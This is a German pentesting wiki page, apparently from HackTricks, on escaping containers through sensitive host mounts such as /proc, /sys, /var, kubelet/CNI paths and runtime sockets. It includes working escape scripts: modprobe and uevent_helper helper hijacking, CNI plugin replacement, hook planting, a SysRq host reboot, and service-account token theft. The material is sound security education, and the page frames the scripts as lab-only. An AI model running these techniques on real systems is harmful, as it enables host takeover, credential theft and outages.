# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host-Mounts gehören zu den wichtigsten praktischen Angriffsflächen für Container-Escapes, da sie die sorgfältig isolierte Sicht eines Prozesses oft wieder auf direkte Sichtbarkeit von Host-Ressourcen reduzieren. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, vom kubelet verwalteten Zuständen oder gerätebezogenen Pfaden können Kernel-Steuerungsmöglichkeiten, Zugangsdaten, Dateisysteme benachbarter Container und Runtime-Verwaltungsschnittstellen offenlegen.

Diese Seite steht separat neben den einzelnen Schutzseiten, weil das Missbrauchsmodell mehrere Bereiche umfasst. Ein beschreibbarer Host-Mount ist teilweise wegen der Mount-Namespaces, teilweise wegen der User-Namespaces, teilweise wegen der Abdeckung durch AppArmor oder SELinux und teilweise wegen des konkret freigegebenen Host-Pfads gefährlich. Als eigenständiges Thema lässt sich die Angriffsfläche wesentlich einfacher einschätzen.

Vergleiche außerdem ein beschreibbares Host-Verzeichnis mit dem entsprechenden Pfad in jedem Container. Ist es über ein Verzeichnis mit ausführbaren Startskripten eingehängt, kann ein Host-Benutzer mit geringeren Rechten möglicherweise Code ablegen, den der Entrypoint eines Containers mit höheren Rechten beim nächsten Neustart lädt. Prüfe die genaue Bind-Quelle und das Ziel, die Schreib- und Suchberechtigungen des Verzeichnisses, die Schleife des Entrypoints und die Anforderung einer ausführbaren Datei, die Runtime-UID sowie einen tatsächlichen Neustartauslöser. Container-UID 0 entspricht nicht automatisch Host-UID 0; die User-Namespace-Zuordnung und die Mount-Richtlinie bestimmen die Auswirkungen auf den Host. Bei einer passiven Prüfung sollten Pfade und Berechtigungen gemeldet werden, ohne ein Skript zu schreiben oder den Workload neu zu starten.

Ein Linux-Container kann sich in einer Verwaltungs-VM befinden, die einen Teil eines separaten Windows-Host-Dateisystems freigibt. [VirtualBox Shared Folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) sind eine Möglichkeit, Host-Dateien in einem Gast sichtbar zu machen. Root in dieser VM ist jedoch weiterhin eine andere Identität als ein Windows-Administrator. Gibt die Freigabe den privaten SSH-Schlüssel eines Benutzers mit Leserechten frei, behandle ihn als möglichen Zugangsdatenhinweis: Prüfe den genauen hostseitig eingebundenen Mount, Eigentümer und Zugriffsrechte des Schlüssels, das zugehörige Konto und die **effektive** Authorized-Keys-Richtlinie des Windows-SSH-Servers, bevor du zu dem Schluss kommst, dass damit eine Host-Anmeldung möglich ist. Bei modernen [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement)-Installationen wird für Administratorkonten üblicherweise eine separate Datei `administrators_authorized_keys` verwendet. Gib Inhalte privater Schlüssel nicht in routinemäßigen Auflistungen aus; für eine passive Ersteinschätzung reichen Metadaten zu Mount und Schlüsselpfad aus.

## `/proc`-Freigabe

procfs enthält sowohl gewöhnliche Prozessinformationen als auch Kernel-Steuerungsschnittstellen mit weitreichenden Auswirkungen. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Container-Sicht, die unerwartete beschreibbare proc-Einträge offenlegt, kann daher zur Offenlegung von Informationen, zu Denial of Service oder zur direkten Codeausführung auf dem Host führen.

Zu den besonders relevanten procfs-Pfaden gehören:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (insbesondere `register` und `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Prüfe zunächst, welche besonders relevanten procfs-Einträge sichtbar oder beschreibbar sind:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können bei Schreibzugriff zu Pfaden für Code-Execution auf dem Host werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind wertvolle Quellen für Reconnaissance bei Kernel-Exploitation. `sched_debug` und `mountinfo` geben Einblick in Prozesse, cgroups und Dateisystemkontext und können dabei helfen, das Host-Layout aus dem Container heraus zu rekonstruieren.

Der praktische Nutzen der einzelnen Pfade unterscheidet sich. Sie alle so zu behandeln, als hätten sie dieselben Auswirkungen, erschwert die Triage:

- `/proc/sys/kernel/core_pattern`
  Wenn dieser Pfad beschreibbar ist, zählt er zu den Pfaden in procfs mit den schwerwiegendsten Auswirkungen, da der Kernel nach einem Absturz einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf eine Payload in seinem Overlay oder in einem eingebundenen Host-Pfad setzen kann, kann oft Code-Execution auf dem Host erreichen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein konkretes Beispiel.
- `/proc/sys/kernel/modprobe`
  Dieser Pfad steuert den Userspace-Helfer, den der Kernel aufruft, wenn er die Logik zum Laden von Modulen ausführen muss. Ist er aus dem Container heraus beschreibbar und wird im Host-Kontext interpretiert, kann er zu einer weiteren Primitive für Code-Execution auf dem Host werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helfer aufzurufen.
- `/proc/sys/vm/panic_on_oom`
  Dies ist normalerweise keine direkte Escape-Primitive, kann aber durch die Umwandlung von OOM-Bedingungen in Kernel-Panic-Verhalten aus Speicherdruck eine hostweite Dienstverweigerung machen.
- `/proc/sys/fs/binfmt_misc`
  Wenn die Registrierungsoberfläche beschreibbar ist, kann der Angreifer einen Handler für einen ausgewählten Magic Value registrieren und so Code-Execution im Host-Kontext erreichen, wenn eine passende Datei ausgeführt wird.
- `/proc/config.gz`
  Nützlich für die Triage von Kernel-Exploits. Damit lässt sich feststellen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne Host-Paketmetadaten zu benötigen.
- `/proc/sysrq-trigger`
  Vor allem ein Pfad für Dienstverweigerung, aber ein sehr schwerwiegender. Er kann den Host sofort neu starten, in eine Panic versetzen oder anderweitig stören.
- `/proc/kmsg`
  Gibt Kernel-Ringbuffer-Meldungen preis. Nützlich für Host-Fingerprinting und Crash-Analysen sowie in manchen Umgebungen zum Leaken von Informationen, die bei der Kernel-Exploitation helfen.
- `/proc/kallsyms`
  Wertvoll, wenn lesbar, da es Informationen zu exportierten Kernel-Symbolen offenlegt und bei der Kernel-Exploit-Entwicklung helfen kann, Annahmen zur Address Randomization zu umgehen.
- `/proc/[pid]/mem`
  Dies ist eine direkte Schnittstelle zum Prozessspeicher. Ist der Zielprozess unter den erforderlichen ptrace-ähnlichen Bedingungen erreichbar, kann sie das Lesen oder Ändern des Speichers eines anderen Prozesses ermöglichen. Die tatsächlichen Auswirkungen hängen stark von Credentials, `hidepid`, Yama und ptrace-Beschränkungen ab. Daher ist dieser Pfad mächtig, aber nur unter bestimmten Bedingungen nutzbar.
- `/proc/kcore`
  Stellt eine Ansicht des Systemspeichers im Stil eines Core-Images bereit. Die Datei ist riesig und umständlich zu verwenden. Ist sie jedoch sinnvoll lesbar, deutet das auf eine gravierend offengelegte Host-Speicheroberfläche hin.
- `/dev/kmem` und `/dev/mem`
  Dies sind historisch gesehen wirkungsvolle Schnittstellen für den direkten Zugriff auf den **Gerätespeicher**, keine Dateien in procfs. Auf vielen modernen Systemen fehlen sie oder sind stark eingeschränkt. Kann ein Container jedoch eine hostseitig eingebundene Kopie öffnen, sollte die Offenlegung als kritisch eingestuft werden. Prüfe sie zusammen mit anderen sensiblen `/dev`-Mounts, statt nach den nicht existierenden Pfaden `/proc/kmem` oder `/proc/mem` zu suchen.
- `/proc/sched_debug`
  Leakt Informationen zu Scheduling und Tasks, die Host-Prozessidentitäten offenlegen können, selbst wenn andere Prozessansichten sauberer aussehen als erwartet.
- `/proc/[pid]/mountinfo`
  Äußerst nützlich, um zu rekonstruieren, wo sich der Container tatsächlich auf dem Host befindet, welche Pfade durch ein Overlay bereitgestellt werden und ob ein beschreibbarer Mount Host-Inhalte oder nur die Container-Ebene betrifft.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, verwende sie, um den Host-Pfad des Container-Dateisystems zu ermitteln:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Diese Befehle sind nützlich, da einige Host-Ausführungstricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Beispiel: Vorbereiten eines `modprobe`-Helper-Pfads

Wenn `/proc/sys/kernel/modprobe` aus dem Container heraus beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf eine vom Angreifer kontrollierte Payload umgeleitet werden. Das obere Overlay-Verzeichnis muss sich aus Sicht des Hosts auflösen lassen, und der Nachweis muss in dieselbe für den Host sichtbare Container-Ebene geschrieben werden, falls der Container nicht auch das Host-`/tmp` einbindet:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Der genaue Trigger hängt vom Ziel und dem Verhalten des Kernels ab und wird bewusst nicht erraten. Stelle den ursprünglichen Wert wieder her, bevor du das Lab verlässt. Wichtig ist, dass ein beschreibbarer Helper-Pfad einen späteren Aufruf des Kernel-Helpers auf vom Angreifer kontrollierte Inhalte im Host-Pfad umleiten kann. Ein fehlendes Overlay-`upperdir`, ein Pfad, den der Host nicht auflösen kann, ein schreibgeschützter sysctl-Mount oder ein Kernel, der den ausgewählten Helper nie aufruft, unterbricht diese Kette.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn es um die Einschätzung der Ausnutzbarkeit statt um einen sofortigen Escape geht:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Diese Befehle helfen dabei festzustellen, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernelmeldungen interessante Zustände offenbaren und welche Kernel-Funktionen oder Mitigations einkompiliert sind. Die Auswirkungen führen normalerweise nicht direkt zu einem Escape, können aber die Triage von Kernel-Schwachstellen erheblich beschleunigen.

### Vollständiges Beispiel: Host-Neustart über SysRq

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Sicht erreicht:

```bash
echo b > /proc/sysrq-trigger
```

Der Effekt ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Fall, zeigt aber deutlich, dass die Offenlegung von procfs weitaus schwerwiegender sein kann als die Offenlegung von Informationen.

## Offenlegung von `/sys`

sysfs legt große Mengen an Kernel- und Gerätezustand offen. Einige sysfs-Pfade sind hauptsächlich für Fingerprinting nützlich, während andere die Ausführung von Helfern, das Geräteverhalten, die Konfiguration von Sicherheitsmodulen oder den Firmware-Zustand beeinflussen können.

Zu den besonders wichtigen sysfs-Pfaden gehören:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten der Wärmeregulierung und damit die Stabilität des Hosts in Umgebungen mit mangelhafter Abschottung beeinflussen. `/sys/kernel/vmcoreinfo` kann Informationen zu Crash-Dumps und zum Kernel-Layout leaken, die beim Low-Level-Fingerprinting des Hosts helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird; unerwarteter Zugriff darauf kann daher MAC-bezogene Zustände offenlegen oder verändern. EFI-Variablenpfade können firmwaregestützte Boot-Einstellungen beeinflussen und sind damit deutlich kritischer als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, da es ausdrücklich als Schnittstelle für Entwickler gedacht ist und deutlich geringeren Sicherheitsanforderungen unterliegt als gehärtete Kernel-APIs für den Produktionseinsatz.

Jeder sysfs-Eintrag in dieser Liste ist **abhängig von Kernel, Konfiguration und Hardware**. In aktuellen virtualisierten Umgebungen fehlen häufig `uevent_helper`, EFI-Variablen und Einträge für thermische Geräte vollständig. Halte einen nicht vorhandenen Pfad als fehlende Voraussetzung fest, statt anzunehmen, dass ein Beispiel aus einem anderen Kernel auch hier zutrifft.

Nützliche Prüf-Befehle für diese Pfade sind:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die nur auf dem Host hätte sichtbar sein sollen.
- `/sys/kernel/debug` ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` eingehängt und les- oder beschreibbar ist, ist mit einer umfangreichen kernelnahen Angriffsfläche zu rechnen, deren genaues Risiko von den aktivierten Debug-Knoten abhängt.
- Der Zugriff auf EFI-Variablen ist seltener, hat aber große Auswirkungen, da er Firmware-gestützte Einstellungen statt gewöhnlicher Laufzeitdateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für die Host-Stabilität und die Interaktion mit der Hardware relevant, nicht für einen unkomplizierten Escape per Shell.
- `/sys/kernel/vmcoreinfo` dient hauptsächlich als Quelle für Host-Fingerprinting und Crash-Analyse und ist nützlich, um den Kernel-Zustand auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

`/sys/kernel/uevent_helper` ist vom Kernel und der Konfiguration abhängig und fehlt auf vielen aktuellen Systemen. Wenn die Datei existiert, beschreibbar ist und ein nutzbarer `uevent`-Trigger verfügbar ist, kann der Kernel einen vom Angreifer kontrollierten Helfer ausführen. Die Nachweis-Ausgabe muss einen Pfad verwenden, der sowohl aus der Sicht des Hosts als auch des Containers sichtbar ist:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Der Grund, warum das funktioniert, ist, dass der Helper-Pfad aus Sicht des Hosts interpretiert wird. Sobald der Vorgang ausgelöst wird, läuft der Helper im Host-Kontext statt im aktuellen Container. `/sys/class/mem/null/uevent` ist ein konkreter Auslöser auf Kerneln, die diese Datei bereitstellen; andere Geräte können eigene `uevent`-Dateien bereitstellen, aber wähle auf echter Hardware nicht blind eine davon aus. Stelle den ursprünglichen Wert wieder her, bevor du die Lab-Umgebung verlässt. Gib diese Technik nicht als verfügbar an, wenn die Helper-Datei oder ein kontrollierter Auslöser fehlt.

## Zugriff auf `/var`

Das Einbinden von `/var` des Hosts in einen Container wird oft unterschätzt, weil es nicht so dramatisch wirkt wie das Einbinden von `/`. In der Praxis kann es ausreichen, um Runtime-Sockets, Container-Snapshot-Verzeichnisse, von kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und benachbarte Anwendungsdateisysteme zu erreichen. Auf modernen Nodes befindet sich der betrieblich interessanteste Container-Status oft tatsächlich unter `/var`.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann oft die projizierten Tokens anderer Pods und Overlay-Snapshot-Inhalte lesen:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Diese Befehle sind nützlich, weil sie zeigen, ob der Mount nur uninteressante Anwendungsdaten oder besonders sensible Cluster-Anmeldedaten offenlegt. Ein lesbares Service-Account-Token kann lokale Codeausführung unmittelbar in Zugriff auf die Kubernetes API verwandeln.

Wenn das Token vorhanden ist, prüfe, worauf es zugreifen kann, statt dich mit dem Auffinden des Tokens zufriedenzugeben:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Die Auswirkungen können hier weit über den Zugriff auf den lokalen Node hinausgehen. Ein Token mit weitreichenden RBAC-Berechtigungen kann aus einem eingebundenen `/var` eine clusterweite Kompromittierung machen.

### Docker- und containerd-Beispiel

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf Kubernetes-Nodes mit containerd unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Wenn das eingebundene `/var` beschreibbare Snapshot-Inhalte eines anderen Workloads offenlegt, kann der Angreifer möglicherweise Anwendungsdateien ändern, Webinhalte platzieren oder Startskripte ändern, ohne die Konfiguration des aktuellen Containers anzutasten.

Bei einem **Wegwerf-Lab-Workload** können beschreibbare Snapshot-Inhalte dazu dienen, Manipulationen an Anwendungen, die Wiederherstellung von Secrets oder laterale Bewegungen zu demonstrieren. Ordne zuerst die Runtime-Container-ID dem exakten Snapshot zu und bearbeite niemals einen nicht zugehörigen oder produktiven Snapshot:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Diese Befehle sind nützlich, weil sie die drei wichtigsten Auswirkungsbereiche eines gemounteten `/var` zeigen: Manipulation von Anwendungen, Wiederherstellung von Secrets und laterale Bewegung in benachbarte Workloads.

Direkte Schreibvorgänge in Snapshots umgehen die normale Zustandsverwaltung der Runtime und können den Container beschädigen oder Beweise vernichten. Eine schreibgeschützte Erkundung wurde lokal mit Docker `overlay2` reproduziert: Ein Marker, der in einen benachbarten, nur für Tests erstellten Container geschrieben wurde, erschien unter `/var/lib/docker/overlay2/<id>/diff/`. Beschränke Änderungen an tatsächlichen Snapshots auf einen nur für diesen Test erstellten, entbehrlichen Container.

## Kubelet-Zustand, Plugins und CNI-Pfade

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` ist häufig über privilegierte DaemonSets, CNI-Agenten, CSI-Node-Plugins, GPU-Operatoren und Storage-Helfer verfügbar. Diese Mounts lassen sich leicht als „Node-Verkabelung“ abtun, liegen jedoch direkt im Ausführungspfad neuer Pods und enthalten oft Kubelet-Anmeldedaten, projizierte Secrets, Registrierungssockets und ausführbare Plugin-Binärdateien auf dem Host.

Zu den besonders wertvollen Zielen gehören:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche Befehle zur Überprüfung sind:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet-Clientzertifikate und andere knotenlokale Zugangsdaten offenlegen, die je nach Clusterdesign manchmal gegenüber dem API-Server oder kubeletseitigen TLS-Endpunkten wiederverwendet werden können.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` enthält häufig projizierte Service-Account-Tokens und eingebundene Secrets benachbarter Pods auf demselben Knoten.
- `/var/lib/kubelet/pod-resources/kubelet.sock` dient hauptsächlich der Reconnaissance, ist dafür aber sehr nützlich: Es zeigt, welche Pods und Container aktuell GPUs, Hugepages, SR-IOV-Geräte und andere knotenlokale Ressourcen mit begrenzter Verfügbarkeit nutzen.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI-, DRA- und Device-Plugins installiert sind und mit welchen Sockets der kubelet kommunizieren soll. Sind diese Verzeichnisse beschreibbar und nicht nur lesbar, ist der Fund deutlich schwerwiegender.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt im Pfad für die Einrichtung des Pod-Netzwerks. Schreibzugriff darauf ist oft eine verzögerte Möglichkeit zur Host-Ausführung und nicht bloß die Offenlegung von Konfigurationen.<sup>[[2]](#references)</sup>

### Vollständiges Beispiel: Beschreibbares `/opt/cni/bin`

Wenn ein Host-CNI-Binärverzeichnis mit Lese- und Schreibzugriff eingebunden ist, kann es ausreichen, ein Plugin zu ersetzen, um beim nächsten Erstellen einer Pod-Sandbox auf diesem Knoten durch den kubelet Host-Ausführung zu erlangen:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Dies ist nicht so unmittelbar wie ein eingebundenes `docker.sock`, aber in kompromittierten Kubernetes-Infrastruktur-Pods oft realistischer. Die Markierung wird neben dem eingebundenen Plugin geschrieben, sodass der Container sie abrufen kann, selbst wenn weder ein Host-Root- noch ein Host-`/tmp`-Mount vorhanden ist. Der wrapper behält die ursprünglichen Argumente und die Standardeingabe bei; anschließend stellt das Beispiel die ursprüngliche Binärdatei wieder her. Entscheidend ist, dass die geänderte Binärdatei später vom Netzwerk-Setup-Ablauf des Hosts ausgeführt wird, nicht vom aktuellen Container. Verwende dafür ausschließlich einen Wegwerf-Node, da ein ungültiger wrapper verhindern kann, dass neue Pod-Sandboxes Netzwerkzugriff erhalten.

## Runtime-Sockets

Sensible Host-Mounts umfassen häufig Runtime-Sockets statt vollständiger Verzeichnisse. Sie sind so wichtig, dass sie hier ausdrücklich noch einmal erwähnt werden sollten:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploitation-Abläufe, sobald einer dieser Sockets gemountet ist.

Als schnelles Muster für die erste Interaktion:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Wenn eine dieser Methoden erfolgreich ist, ist der Weg vom „gemounteten Socket“ zum „Starten eines privilegierteren Geschwister-Containers“ in der Regel viel kürzer als jeder Kernel-Breakout-Pfad.

Derselbe Daemon-Zugriff kann auch **Host-Persistence** ermöglichen. Ein Hilfscontainer mit einem beschreibbaren Bind-Mount des Host-Roots kann Dateien per `docker cp` empfangen und anschließend mit `docker exec` einen SSH-Schlüssel, eine Service-Unit oder eine andere Persistence-Datei im gemounteten Host-Pfad ablegen. Die Sicherheitsgrenze ist die Berechtigung des Daemons, den Host-Mount zu erstellen; `docker cp` ist nur ein Zwischenschritt. Prüfe sowohl neu erstellte Container als auch Schreibvorgänge in Host-Authentifizierungs- oder Startpfade, nachdem ein Runtime-Socket offengelegt wurde.

## Hijacking von Aufgaben über beschreibbare Host-Pfade

Ein beschreibbarer Host-Mount muss nicht `/` freigeben, um gefährlich zu sein. Wenn der gemountete Pfad Skripte, Konfigurationsdateien, Hooks, Plugins oder Dateien enthält, die später von einer hostseitigen geplanten Aufgabe oder einem Dienst verwendet werden, kann der Container möglicherweise verändern, was der Host ausführt.

Allgemeiner Prüfablauf:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Wenn eine beschreibbare Datei von einem Host-Prozess verarbeitet wird, halten Sie die Payload beim Testen einfach und beobachtbar:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Der interessante Teil ist die Vertrauensgrenze: Der Schreibvorgang erfolgt innerhalb des Containers, die Ausführung später jedoch im Kontext des Host-Dienstes. Dadurch wird ein eng begrenzter hostPath oder bind mount zu einer verzögerten Primitive für die Codeausführung auf dem Host.

## Root-eigene Dateien auf einem gemeinsam genutzten Host-Pfad

Ein Container-Konto, das zu root werden kann, kann möglicherweise eine root-eigene Datei auf einem beschreibbaren Pfad ablegen, der auch vom Host verwendet wird. Wenn Container-UID 0 auf Host-UID 0 abgebildet wird, verweisen beide Ansichten auf dieselbe Datei, und der Host-Mount SUID-Ausführung zulässt, kann ein Host-Benutzer, der auf diesem Pfad eine root-eigene SUID-Datei ausführen kann, die Privilegiengrenze des Hosts überschreiten. Für dieses spezielle Problem mit Dateieigentum muss der Container nicht mit `--privileged` laufen. Siehe [user namespace mappings](protections/namespaces/user-namespace.md) und die [SUID discussion](privileged-containers.md) zu den jeweils separaten Bedingungen.

Untersuche den Pfad **von beiden Seiten**: Vergleiche Eigentümer und Identität einer harmlosen Datei, prüfe `uid_map` und `gid_map` des Containers und untersuche die Mount-Optionen sowie die Ausführungsrichtlinie des Hosts. `rw` auf der Container-Seite ohne `nosuid` ist lediglich ein möglicher Ansatzpunkt; daraus lassen sich weder das Eigentum auf dem Host noch die Mount-Flags des Hosts, der Zugriff eines Host-Benutzers oder eine mögliche Blockierung der Ausführung durch AppArmor/SELinux ableiten. `noexec` schränkt die Ausführung in der Ansicht ein, für die es gilt. Die Tags `shared:` und `master:` in `/proc/self/mountinfo` beschreiben die Mount-Propagation, nicht, ob der Dateiinhalt mit dem Host geteilt wird. Ein bind mount kann diese Tags nicht enthalten. Die Wiederverwendung von Zugangsdaten, die eine Host-Anmeldung ermöglicht, ist ein separater Schritt und nicht Teil der Privilegiengrenze durch gemeinsam genutzte Dateien.

Der Runtime-Speicher des Hosts kann auch ohne expliziten bind mount einen ähnlichen Pfad schaffen. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) ermöglichte einem unprivilegierten Host-Benutzer, Docker-Datenunterverzeichnisse zu durchlaufen und Dateien aus einem Container-Dateisystem auszuführen. Moby behob die Berechtigungen in Version 20.10.9 und weist darauf hin, dass laufende Container neu gestartet werden müssen, damit ihre Verzeichnisse korrigiert werden. Prüfe die exakten gemounteten `overlay2/<id>/merged`-Pfade und die Suchberechtigung jedes übergeordneten Verzeichnisses. Stelle anschließend fest, ob Container-UID 0 auf Host-UID 0 abgebildet wird, ob eine echte root-eigene SetUID-Datei vorhanden und erreichbar ist und ob die Host-Ansicht die SetUID-Ausführung zulässt. Rootless- oder User-Namespace-remapped-Container, `nosuid`, `noexec`, `no_new_privs` und MAC-Richtlinien können das Ergebnis beeinflussen. Eine Runtime-Version oder ein durchsuchbarer Pfad allein ist ein Hinweis für eine 